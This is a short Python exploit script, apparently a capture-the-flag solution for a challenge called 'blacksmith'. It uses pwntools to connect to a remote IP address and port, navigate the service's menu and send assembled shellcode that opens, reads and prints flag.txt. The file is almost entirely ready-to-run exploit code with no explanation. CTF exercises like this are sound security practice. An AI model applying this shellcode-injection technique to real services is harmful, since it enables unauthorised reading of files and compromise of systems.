#!/usr/bin/python3

from pwn import *

binary = './blacksmith'
elf = context.binary = ELF(binary,checksec=False)
context.log_level = 'info'
#io = process(binary)
io = remote('138.68.141.81',32337)

#Crafting flag code
shellcode = asm(shellcraft.open('flag.txt'))
shellcode += asm(shellcraft.read(3,'rsp',0x100))
shellcode += asm(shellcraft.write(1,'rsp',0x100))

#Executing payload
io.sendlineafter('>','1')
io.sendlineafter('>','2')
log.info(f'Sending crafted code...')
io.sendlineafter('>',flat(shellcode))

#Getting flag
flag = io.recvline()
log.success(f'Here is the flag: {str(flag.split()[0])}')
